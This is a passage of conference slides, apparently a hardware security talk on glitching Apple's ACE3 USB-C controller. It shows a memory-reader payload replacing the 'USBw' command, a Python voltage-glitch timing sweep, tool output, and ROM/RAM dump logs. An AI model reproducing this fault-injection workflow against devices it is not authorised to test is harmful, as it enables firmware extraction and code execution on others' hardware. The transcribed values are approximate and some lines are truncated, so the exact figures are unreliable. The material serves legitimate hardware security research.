00040f68                 __builtin_strncpy(dest: &data_2004005c_CURRENT_MODE, src: "US  [line continues off the right edge of the slide; row is highlighted]
00040f6c                 data_200424f1 = *r6
00040f6e                 sub_40c6c()
```

## Slide 207

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 78/100 on the text kept, 69/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Left panel, labeled "ACE2 Firmware"]
20406818     int32_t r7 = 0
2040681c     if (probably_current_mode_1 == 'DISC')
204068f0         label_204068f0:
204068f0         r7 = 3
20406822     else
20406822         if (probably_current_mode_1 == 'UFPf')
20406822             goto label_204068f0
20406828         if (probably_current_mode_1 == 'DFUf')
20406828             goto label_204068f0
20406832         if (zx.d(data_200430b9) == 0)
20406832             goto label_204068f0
2040683a         if (sub_2040910c() == 0)
2040683a             goto label_204068f0
20406858         if (zx.d(**(arg2 + 8)) u>> 7 == 0 || (zx.d(  [cut off at panel edge]
2040685a             uint32_t r3_5 = zx.d(*r5)
20406862             if (r3_5 << 0x1f != 0)
20406866                 int32_t probably_current_mode_2 = probably_curr  [cut off at panel edge]
2040686a                 if (probably_current_mode_2 == 'USBw')
2040686a                     goto label_204068f0
20406872                 if (probably_current_mode_2 == 'CFUp')
20406876                     data_200430c9 = 0
2040687a                 data_20046bdc = 0
2040687e                 data_20046bdd = 0
20406886                 if (zx.d(data_20042cb2) u>> 4 == 0xf)
204068a0                     int32_t var_18_1 = 0x183
204068ca                     __builtin_strncpy(dest: &probably_current_mode,  [cut off at panel edge]
204068ce                     data_200429d9 = *r5
204068d8                     int32_t var_1c_1 = 0x8084
204068e8             else if (zx.d(data_20042cb2) u>> 4 == 0xe)
204068f6                 data_200429d9 = r3_5.b
204068fa                 data_20046bdd = 1
204068ee             else
204068ee                 if (probably_current_mode != 'USBw'  [cut off at panel edge]
204068ee                     goto label_204068f0

[Right panel, labeled "ACE3 Flash" -- identical HLIL listing to slide 00146]
00040eee     int32_t r5 = 0
00040ef2     if (data_2004005c_CURRENT_MODE_1 == 'DISC')
00040f84         label_40f84:
00040f84         r5 = 3
00040ef8     else
00040ef8         if (data_2004005c_CURRENT_MODE_1 == 'UFPf')
00040ef8             goto label_40f84
00040efe         if (data_2004005c_CURRENT_MODE_1 == 'DFUf')
00040efe             goto label_40f84
00040f02         var_18 = &data_20042988
00040f08         if (zx.d(data_20042991) == 0)
00040f08             goto label_40f84
00040f10         if (sub_44cc8() == 0)
00040f10             goto label_40f84
00040f28         if (zx.d(**(arg2 + 4)) u>> 7 == 0 || (zx.d(**(arg2 + 4)) u>> 7 != 0 &  [cut off at panel edge]
00040f40             int32_t data_2004005c_CURRENT_MODE_2 = data_2004005c_CURRENT_MODE  [cut off at panel edge]
00040f42             if (zx.d(*r6) << 0x1f == 0)
00040f82                 if (data_2004005c_CURRENT_MODE_2 != 'USBw')
00040f82                     goto label_40f84
00040f88                 data_2005671e = 0
00040f8a                 uint32_t r0_18 = zx.d(*r6)
00040f8c                 data_200424f1 = r0_18.b
00040f8e                 sub_40e14(r0_18, 'USBw', 0, 0x2005671e)
00040f48             else
00040f48                 if (data_2004005c_CURRENT_MODE_2 == 'USBw')
00040f48                     goto label_40f84
00040f4e                 if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
00040f52                     *(var_18 + 0x19) = 0
00040f58                 if (var_20 == 7)
00040f5e                     var_20 = 0x183
00040f62                     sub_35d22(&var_20)
00040f68                 __builtin_strncpy(dest: &data_2004005c_CURRENT_MODE, src: "US  [cut off at panel edge]
00040f6c                 data_200424f1 = *r6
00040f6e                 sub_40c6c()
```

## Slide 208

##### USBw Command Handler

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 70/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
USBw Command Handler

[Left panel, labeled "ACE2 Firmware"]
20406818     int32_t r7 = 0
2040681c     if (probably_current_mode_1 == 'DISC')
204068f0         label_204068f0:
204068f0         r7 = 3
20406822     else
20406822         if (probably_current_mode_1 == 'UFPf')
20406822             goto label_204068f0
20406828         if (probably_current_mode_1 == 'DFUf')
20406828             goto label_204068f0
20406832         if (zx.d(data_200430b9) == 0)
20406832             goto label_204068f0
2040683a         if (sub_2040910c() == 0)
2040683a             goto label_204068f0
20406858         if (zx.d(**(arg2 + 8)) u>> 7 == 0 || (zx.d(  [cut off at panel edge]
2040685a             uint32_t r3_5 = zx.d(*r5)
20406862             if (r3_5 << 0x1f != 0)
20406866                 int32_t probably_current_mode_2 = probably_curr  [cut off at panel edge]
2040686a                 if (probably_current_mode_2 == 'USBw')
2040686a                     goto label_204068f0
20406872                 if (probably_current_mode_2 == 'CFUp')
20406876                     data_200430c9 = 0
2040687a                 data_20046bdc = 0
2040687e                 data_20046bdd = 0
20406886                 if (zx.d(data_20042cb2) u>> 4 == 0xf)
204068a0                     int32_t var_18_1 = 0x183
204068ca                     __builtin_strncpy(dest: &probably_current_mode,  [cut off at panel edge]
204068ce                     data_200429d9 = *r5
204068d8                     int32_t var_1c_1 = 0x8084
204068e8             else if (zx.d(data_20042cb2) u>> 4 == 0xe)
204068f6                 data_200429d9 = r3_5.b
204068fa                 data_20046bdd = 1
204068ee             else
204068ee                 if (probably_current_mode != 'USBw'  [cut off at panel edge]
204068ee                     goto label_204068f0

[Right panel, labeled "ACE3 Flash" -- identical HLIL listing to slide 00146]
00040eee     int32_t r5 = 0
00040ef2     if (data_2004005c_CURRENT_MODE_1 == 'DISC')
00040f84         label_40f84:
00040f84         r5 = 3
00040ef8     else
00040ef8         if (data_2004005c_CURRENT_MODE_1 == 'UFPf')
00040ef8             goto label_40f84
00040efe         if (data_2004005c_CURRENT_MODE_1 == 'DFUf')
00040efe             goto label_40f84
00040f02         var_18 = &data_20042988
00040f08         if (zx.d(data_20042991) == 0)
00040f08             goto label_40f84
00040f10         if (sub_44cc8() == 0)
00040f10             goto label_40f84
00040f28         if (zx.d(**(arg2 + 4)) u>> 7 == 0 || (zx.d(**(arg2 + 4)) u>> 7 != 0 &  [cut off at panel edge]
00040f40             int32_t data_2004005c_CURRENT_MODE_2 = data_2004005c_CURRENT_MODE  [cut off at panel edge]
00040f42             if (zx.d(*r6) << 0x1f == 0)
00040f82                 if (data_2004005c_CURRENT_MODE_2 != 'USBw')
00040f82                     goto label_40f84
00040f88                 data_2005671e = 0
00040f8a                 uint32_t r0_18 = zx.d(*r6)
00040f8c                 data_200424f1 = r0_18.b
00040f8e                 sub_40e14(r0_18, 'USBw', 0, 0x2005671e)
00040f48             else
00040f48                 if (data_2004005c_CURRENT_MODE_2 == 'USBw')
00040f48                     goto label_40f84
00040f4e                 if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
00040f52                     *(var_18 + 0x19) = 0
00040f58                 if (var_20 == 7)
00040f5e                     var_20 = 0x183
00040f62                     sub_35d22(&var_20)
00040f68                 __builtin_strncpy(dest: &data_2004005c_CURRENT_MODE, src: "US  [cut off at panel edge]
00040f6c                 data_200424f1 = *r6
00040f6e                 sub_40c6c()
```

## Slide 209

###### Payload

\```
push    {r4, r5, r6, lr}
ldr r4, [r1, #4]
ldr r0, [r4]
ldr     r0, [r0]
str     r0, [r4]
movs r0, #0xFF
pop     {r4, r5, r6, pc}
\```

Trivial memory reader Takes in address Returns bytes at address

**hextree** .io

## Slide 210

###### Attempt  2: Replaced USBw Command

**hextree** .io

## Slide 211

**hextree** .io


> Recovered by OCR — confidence 91/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
center = 44793408
pulse = 20
success = False
while not success:
for delay in trange(center - 1000, center + 1000):
setup_husky(delay, pulse)
result = test_ace()
print(f'"{result} {delay} {pulse}")
if result == "APP":
print(f"Success: {delay}")
success = True
break
Python
Python
xtree.io
```

## Slide 212

###### `$ sudo ./acetool USBw 00000000`

**hextree** .io

## Slide 213

\```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20
Status: APP
\```

**hextree** .io

## Slide 214

\```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20
Status: APP
\```

**hextree** .io

## Slide 215

\```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20 20 06 00 00
Status: APP
\```

**hextree** .io

## Slide 216

\```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20 20 06 00 00Stack pointer reset value
Status: APP
\```

**hextree** .io

## Slide 217

`$ sudo ./acetool USBw 00000000 Status: APP Running command: USBw - Data: 4 Executing command Result is: 00 00 06 20 20 06 00 00 Stack pointer reset value Status: APP` We can read (and write) arbitrary memory!

**hextree** .io

## Slide 218

###### Time to dump

**hextree** .io

## Slide 219

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 65/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 50 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 40 6B 00 28 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x27354
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 54 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 04 D1 AB 49 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x27358
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 58 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 01 20 00 07 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x2735c
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 5C to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 58 31 08 63 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x27360
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 60 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 0E F0 1C FD \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x27364
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 64 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 10 BD 10 B5 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x27368
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 68 to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: DA F7 96 FF \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
0x2736c
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IOService:/AppleARMPE/arm-io@10F00000/AppleH15IO/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nStatus: APP \nAdding char: 6C to 00000000\nAdding char: 73 to 00000001\nAdding char: 02 to 00000002\nAdding char: 00 to 00000003\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: AB 48 C1 68 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nRes is: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \nStatus: APP \n'
```

## Slide 220

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
image_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
[tab: image_combined.bin.bndb]
Mapped ▾  Linear ▾  High Level IL ▾

[Left panel: Types]
Types  [Search types]
Name                                    Size
▼ User Types: image_combined.bin.bndb
   [S] command_handler                  0x8
System Types: image_combined.bin....
Platform: thumb2

struct command_handler __packed
{
00      char command[0x4];
04      int32_t (* handler)(int32_t cmd,
            int32_t* args);
08  };

Cross References
▶ Filter (191)
▼ Data References                                {10}
  |← 00000008  void* data_8
  |← 00000010  void* data_10
  |← 00000014  void* data_14
  |← 00000018  void* data_18
  |← 0000001c  void* data_1c
  |← 00000020  void* data_20
  |← 00000024  void* data_24
  |← 00000028  void* data_28
  |← 00000030  void* data_30
  |← 00000034  void* data_34

[Right panel: disassembly / High Level IL]
0x0
Architecture: thumb2

Segments:
r-x  0x00000000-0x00058000
---  0x00058000-0x00058014
rwx  0x20040000-0x20058000

Sections:
0x00058000-0x00058014  .synthetic_builtins  {External}
0x200409a8-0x200421e8  pointer-list  {Code}

00000000   void* data_0 = 0x20060000
00000004   void* data_4 = stack_init
00000008   void* data_8 = nullptr
0000000c   void* data_c = sub_f4
00000010   void* data_10 = nullptr
00000014   void* data_14 = nullptr
00000018   void* data_18 = nullptr
0000001c   void* data_1c = nullptr
00000020   void* data_20 = nullptr
00000024   void* data_24 = nullptr
00000028   void* data_28 = nullptr
0000002c   void* data_2c = endless_loop
00000030   void* data_30 = nullptr
00000034   void* data_34 = nullptr
00000038   void* data_38 = sub_34c08
0000003c   void* data_3c = sub_35f0e
00000040   void* data_40 = sub_35c28
00000044   void* data_44 = sub_36d78
00000048   void* data_48 = sub_35d38
0000004c   void* data_4c = sub_36612
00000050   void* data_50 = sub_34338
00000054   wchar16 data_54[0x3f] = "\xd1\x8b\x03\xd0\xbf\x03\xd0\xb3\x03\xfb\x93\x03\xc0\x9d\x03\xfb\xb1\x03\xfd\x91"
00000054        "\x03\xfe\xa5\x03\xca\x89\x03\xca\x81\x03\xf5\xab\x03\xf5\xa1\x03\xee\x89\x03\xf5\xb5\x03\xf0\xa9\x03"
00000054        "\xf8\x99\x03\xc4\xb7\x03\xc2\x81\x03\xfa\xab\x03\xcb\xb7\x03\xcc\xaf\x03\xfe\xb1\x03\xff\x95\x03"
00000054        "\xcd\x8d\x03\xcc\x8f\x03\xcc\xa5\x03\xcd\x83\x03\xe0\x83\xda\x85\xc0\xb7\xfd\x84\xe0\x80\xdc\x80"
00000054        "\xff\xbd\x01", 0

000000c8   int32_t sub_c8()

00011000       sub_10c86()
00011008       *0x40050064 = 2
00011016       sub_35d7e(0x40094124, *0x40094124 | 8)
0001101a       sub_633a()
[next line clipped by the bottom edge of the window] [illegible]

[status bar] ⊗ 30    ⚠ 25    thumb2    0x0-0x4 (0x4 bytes)
```

## Slide 221

😎 Full dump of the ACE3 ROM & RAM!

**hextree** .io


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 82/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
[Left panel: Types]
Search types
Name / Size
▾ User Types: image_combined.bin.bndb
  command_handler   0x8
System Types: image_combined.bin....
Platform: thumb2

struct command_handler __packed
{
00    char command[0x4];
04    int32_t (* handler)(int32_t cmd,
          int32_t* args);
08    };

[Title bar] image_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
[Toolbar] Mapped ▾  Linear ▾  High Level IL ▾

[Main panel]
0x0

Architecture: thumb2

Segments:
r-x  0x00000000-0x00058000
---  0x00058000-0x00058014
rwx  0x20040000-0x20058000

Sections:
0x00058000-0x00058014  .synthetic_builtins  {External}
0x200409a8-0x200421e8  pointer-list  {Code}

00000000  void* data_0 = 0x20060000
00000004  void* data_4 = stack_init
00000008  void* data_8 = nullptr
0000000c  void* data_c = sub_f4
00000010  void* data_10 = nullptr
00000014  void* data_14 = nullptr
00000018  void* data_18 = nullptr
0000001c  void* data_1c = nullptr
00000020  void* data_20 = nullptr
00000024  void* data_24 = nullptr
00000028  void* data_28 = nullptr
0000002c  void* data_2c = endless_loop
00000030  void* data_30 = nullptr
00000034  void* data_34 = nullptr
00000038  void* data_38 = sub_34c08
0000003c  void* data_3c = sub_35f0e
00000040  void* data_40 = sub_35c28
00000044  void* data_44 = sub_36d78
00000048  void* data_48 = sub_35d38
0000004c  void* data_4c = sub_36612
00000050  void* data_50 = sub_34338
00000054  wchar16 data_54[0x3f] = "\xd1\x8b\x03\xd0\xbf\x03\xd0\xb3\x03\xfb\x93\x03\xc0\x9d\x03\xfb\xb1\x03\xfd\x91"
00000054      "\x03\xfe\xa5\x03\xca\x89\x03\xca\x81\x03\xf5\xab\x03\xf5\xa1\x03\xee\x89\x03\xf5\xb5\x03\xf0\xa9\x03"
00000054      "\xf8\x99\x03\xc4\xb7\x03\xc2\x81\x03\xfa\xab\x03\xcb\xb7\x03\xcc\xaf\x03\xfe\xb1\x03\xff\x95\x03"
00000054      "\xcd\x8d\x03\xcc\x8f\x03\xcc\xa5\x03\xcd\x83\x03\xe0\x83\xda\x85\xc0\xb7\xfd\x84\xe0\x80\xdc\x80"
00000054      "\xff\xbd\x01", 0

000000c8  int32_t sub_c8()

00011000      sub_10c86()
00011008      *0x40050064 = 2
00011016      sub_35d7e(0x40094124, *0x40094124 | 8)
0001101a      sub_633a()

[Right panel: Cross References]
Filter (191)
▾ Data References  {10}
  00000008  void* data_8
  00000010  void* data_10
  00000014  void* data_14
  00000018  void* data_18
  0000001c  void* data_1c
  00000020  void* data_20
  00000024  void* data_24
  00000028  void* data_28
  00000030  void* data_30
  00000034  void* data_34

[Status bar] 30 errors, 25 warnings, thumb2, 0x0-0x4 (0x4 bytes)

[Slide caption] Full dump of the ACE3 ROM & RAM! 😎
```

## Slide 222

###### Dumping unknown silicon is possible

And it's not super difficult We can get code-execution without having the firmware We can now start researching the ACE3!

**hextree** .io

## Slide 223

#### Thank you!

**hextree** .io
